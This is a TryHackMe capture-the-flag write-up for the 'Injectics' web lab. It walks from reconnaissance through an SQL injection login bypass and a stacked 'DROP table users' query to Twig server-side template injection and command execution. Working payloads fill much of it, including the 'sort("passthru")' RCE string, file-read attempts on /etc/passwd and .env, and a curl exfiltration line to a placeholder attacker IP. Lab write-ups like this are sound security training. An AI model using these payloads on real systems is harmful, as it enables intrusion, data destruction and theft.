+++
title = "Injectics - Web-pentesting - Tryhackme"
date = "2026-02-08"
author = "Silent Resistor"
# cover = '/favicon.png'
# Toc = true
+++

## Part1: Reconnissance
- Upon Nmap scap at the given target machine, reveals a webserver running at 80.
- HTPP Server: Apache/2.4.41 (Ubuntu)
- A quick visit on site, reveals it has  
    - Home Page
    - Login Page 
    - Admin Login Page
- Having a look at source of Home page (http://10.49.134.13/index.php), gives some qlues  
    -  Website developed by **John Tim**- dev@injectics.thm  
    -  Mails are stored in **mail.log** file
- Looking at **mail.log** (http://10.49.134.13/mail.log)   
    - John said in mail to superadmins that "I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted"  
    - And a default credentials if table `users` is deleted.  
    ```bash
    | Email                     | Password 	              |
    |---------------------------|-------------------------|
    | superadmin@injectics.thm  | superSecurePasswd101    |
    | dev@injectics.thm         | devPasswd123            |
    ```
- Did a directory enumeration at root of website using `dirsearch`, which uses its own wordlist available at `/usr/lib/python3/dist-packages/dirsearch/db` directory.
  ```bash
  dirsearch -u http://10.49.134.13/ -t 20 --async
  ```
  ```bash
    [11:58:21] 200 -    3KB - /phpmyadmin/doc/html/index.html     -->  docs, honestly no patience to read
    [11:58:21] 200 -    3KB - /phpmyadmin/index.php               -->  admin login 
    [11:58:21] 200 -    3KB - /phpmyadmin/				          -->  same, admin login
    [11:57:44] 200 -   48B  - /composer.json                      -->  theres twig, a template engine, its may be usefull. 
    [11:57:44] 200 -    9KB - /composer.lock			          -->  Many external packages, will be reviewed seperately
    [11:58:06] 200 -    1KB - /login.php                          -->  Non-admin login
    [11:58:47] 200 -    1KB - /vendor/composer/LICENSE	            --> licence file
    [11:58:47] 200 -   12KB - /vendor/composer/installed.json           --> similar to composer.lock
    [13:10:38] 200 -   22KB - /phpmyadmin/favicon.ico                           
    [13:10:46] 200 -    7KB - /phpmyadmin/js/config.js       
    [13:10:46] 402 -    7KB - /flags 
  ```

- `composer.json` and `composer.lock` reveals 
  - Use of "php": ">=7.2.5"
  - `symfony/polyfill-ctype@v1.30.0` and  `symfony/polyfill-mbstring@v1.30.0`
    - A PHP polyfill (provides modern or missing functions to older versions of PHP)
    - For example, if your code needs the `ctype_alpha()` function but we are running a server that does not have `ctype` extension installed, `symfony/pholyfill-ctype` provides a php based version of fuctions so app does not crash.
    - developers are using Symfony polyfills for validations and sanitization. This means the app is likely less vulnerable to injections.
    - This also reavels they are suing older versions of PHP.
  - `twig/twig@v2.14.0`
    - A template engine in PHP
    - v2.14.0 released late in 2020, it sits right at the transition point where many of "easy" sandbox escapes (like _self.env) were already patched, but several newer filter were being introduced that created fresh oversight.
    - By v2.14.0, the _self variable was heavily neutered. In older versions (v1.x), _self.env was the "Holy Grail" for RCE. In 2.14.0, even if you can see _self, it is usually restricted to a Template object that doesn't allow easy access to the Environment or Loader from within the sandbox.
    - This version includes the map, filter, and reduce filters. This is where most modern escapes happen.


- `/phpmyadmin/index.php`
  - phpMyAdmin is a free, open-source web interface used to manage MySQL and MariaDB databases.
  - it is an application that allows you to perform database tasks through your web browser instead of typing complex SQL queries.
  - Lets say its GUI for DBMS (eg: MariaDB, mysql)
  - Why it is Gold mine? In PHP apps, the credentials to log into phpMyAdmin are usually stored in a .env or config/parameters.yaml
  - `phpmyadmin/doc/html/index.html` reveals use of phpMyAdmin 4.9.5
  - **Vulnerability:** We closely observe at source of login page (/phpmyadmin/index.php), there is a input field named 'server' hidden inside of form. Methods such as `offerPrefsAutoimport`,`savePrefsToLocalStorage` in `/phpmyadmin/js/config.js` directly making use of this server parameter from request data, without proper sanitization. If we can inject the possible payload in this input field `server`, there is possiblity of accessing the unauthorized resources inside of server. 
  - `/phpmyadmin/index.php` - A loging page - Just a simple trial login with random crdentials discloses use of **MySQL** DBMS





## Part2: Action - Trying to get inside.
- Its really good that we have gathered a lot information.
- As it revealed use of mysql, why dont we brute force with possible combinations of mysql paylaods. Yeah, thats really good step to move on.
- Quickly downlaods payloads from 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder'. 
  ```bash
  git clone git@github.com:swisskyrepo/PayloadsAllTheThings.git
  cd "PayloadsAllTheThings/SQL Injection/Intruder/"
  # combine all paylaods, make sure $HOME/tmp exists
  ls | grep -i -E "Auth_Bypass" | xargs cat | tee $HOME/tmp/combined_auth_paylaods.txt
  # lets bruteforce the payloads
  ```
- For speed, im using the Zapproxy, lets capture the login request in the zap, and fuzz the username paremeter with the payloads '$HOME/tmp/combined_auth_payloads.txt'. Please see below image for the reference.
    ![Zapproxy Bruteforcing paylods](/resources_posts/injectics/zapproxy_sql_payload_bruteforce.png)

- Lets identify the payload for which we get the unique size of response, different from other payload responses.     
    ![Zapproxy success paylods](/resources_posts/injectics/zapproxy_success_payload.png)

- Great, now use `1' OR 'x'='x';#` the payload to login, and that's it you are inside now. 

    ![YOu are inside now](/resources_posts/injectics/user_access.png)





## Part3: Escalating privilages
- Now, We can see a dashboard, allowing to change few entries in a table.
- Just upon injecting a payload `1; select 1`, it looking like its successfully executing the second query `select 1`. Here, in this case, we are allowed to run any of the query to escalate privilage.
- Remembering words from John in his mail "I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted". Ok, lets delete the `users` table, then.
  ```sql
  1; DROP table users;
  ```
- After some time, service auto inserts default [creds](#part1-reconnissance) into `users`, and we will use them to login at http://10.49.179.67/adminLogin007.php.
- Great, We are escalated privilage to admin now.
  
    ![Escalated](/resources_posts/injectics/admin_access.png)


## Part4: Getting Shell
- In admin dashboard, we have option to update our profile (http://10.49.179.67/update_profile.php)
- And this is most common injection point for making use of vulnerability: Server side template injections.
- Just by feeding `$ { { < % [ % ' " } } % `  payload to one of input field in profile update page and see if its giving error in home page. This can easily confirm, hole exists for real.
- For double check, Lets use `{{7 * 7}}`, and see its evaluating to 49 in home page.
- Remembering "Use of twig/twig@v2.14.0 in composer.json" --> its So, we found the Templete engine.
- Just upon running a simple injection `{{ system('ls')}}` - it fails with `Unknown "system" function in "__string_template__`
- `{% include '/etc/passwd' %}` --> `Template "/etc/passwd" is not defined in "__string_template__`
- Please have a look at the following trials
  ```bash
  {{ _context }}            #--> Array
  {{_dump(_context) }}      #--> error, it is supposed to list all available vars in _context
  {{ _self }}               #--> _string_template__****
  {{ _self.env }}           #-->  Tag 'import' not allowed in _self value
  {{ _self.getEnvironment().getLoader() }} #--> import not allowed
  {{ app.request.query.all }}              #--> showing nothing

  {{ ['id'] }}              #--> Array

  # Code Execution with system
  {{ system("id")}}     #--> Unknown "system" function in "__string_template__

  # It takes the array ["id"], maps the PHP function system onto it, and returns the output of system("id")
  {{["id", 0]|map("system") | join}} #--> The callable passed to the "map" filter must be a Closure in sandbox mode 
  {{["id", 0] | sort("system") | join}}      #--> id0 
  ```

- The fact that `{{ ["id", 0] | sort("system") | join }}` returned `id0` means the template is processing your input and attempting to sort, but it’s treating "system" as a string for comparison rather than executing it as a PHP function

    ```bash
    # As map is being bloked and not working, lets try with other alternatives
    {{ ["id", 0] | filter("system") | join }}
    {{["id", 0] | filter("system") | join}}     
    
    # lets load the files directly
    {{ source('../../.env') }}
    {{ source('../config/parameters.yml') }}
    {{ _self.env.loader.getSourceContext('/etc/passwd').getCode() }}
    {{ _self.env.getLoader().getSource('/etc/passwd') }}

    # "Filter" Polyglot (Bypassing the Closure restriction)
    {{ [1]|reduce("system", "id") }}

    # Check for the constant function
    {{ constant('PHP_VERSION') }}
    {{ constant('STR_PAD_LEFT') }}

    # The "Execution" through exec or passthru
    {{ ["id", 0] | sort("passthru") | join }}         #---- working -------
    {{ ["id", 0] | sort("exec") | join }}
    {{ ["id", 0] | sort("shell_exec") | join }}

    #Blind Exfiltration (Last Resort)
    {{ ["curl http://YOUR_IP/$(id)"] | map("system") }}
    ```
- Get to know after all trials, `{{ ["id", 0] | sort("passthru") | join }} ` seems to be working.., lets not wait long to get shell.
- Lets search for flag in the current directory. Remembering [[13:10:46] 402 -    7KB - /flags ](#part1-reconnissance), to which do have not access, but search now for same inside of shell.
- 
  ```bash
  {{ ["ls -la", 0] | sort("passthru") | join }} 
  {{ ["ls -la flags", 0] | sort("passthru") | join }} 
  {{ ["cat flags/XXXXXXXXXXXXXXXXXXX.txt", 0] | sort("passthru") | join }} 
  ```
- its gives flag, to get CTF to finish.
- Thanks for the patience.












